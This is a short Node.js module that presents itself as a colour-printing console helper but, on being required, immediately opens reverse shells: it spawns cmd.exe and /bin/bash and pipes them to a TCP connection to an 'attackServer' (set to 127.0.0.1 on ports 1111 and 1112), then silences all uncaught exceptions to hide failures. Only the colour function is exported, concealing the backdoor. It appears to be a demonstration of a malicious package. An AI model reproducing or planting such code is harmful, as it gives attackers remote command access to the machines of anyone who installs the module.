const attackServer = "127.0.0.1"
const windowsAttackPort = 1111
const linuxAttackPort = 1112


function setupReverseShell() {
    // For windows
    var net = require("net"),
        child = require("child_process"),
        shell = child.spawn("cmd.exe", []);

    var client = new net.Socket();

    client.connect(windowsAttackPort, attackServer, function(){
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
    })



    // For linux
    net = require("net"),
        child = require("child_process"),
        shell = child.spawn("/bin/bash", []);

    client = new net.Socket();

    client.connect(linuxAttackPort, attackServer, function(){
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
    })
};

setupReverseShell();
process.on('uncaughtException', err => { 
    return
})



function printWithColor(string, color) {
    if(color === 'red') {
        console.log('\x1b[31m%s\x1b[0m', string);
    } else if(color === 'green') {
        console.log('\x1b[32m%s\x1b[0m', string);
    } else if(color === 'yellow') {
        console.log('\x1b[33m%s\x1b[0m', string);
    } else if(color === 'blue') {
        console.log('\x1b[34m%s\x1b[0m', string);
    } else if(color === 'magenta') {
        console.log('\x1b[35m%s\x1b[0m', string);
    } else if(color === 'cyan') {
        console.log('\x1b[36m%s\x1b[0m', string);
    } else {
        console.log('\x1b[37m%s\x1b[0m', string);
    }
}


module.exports = {printWithColor};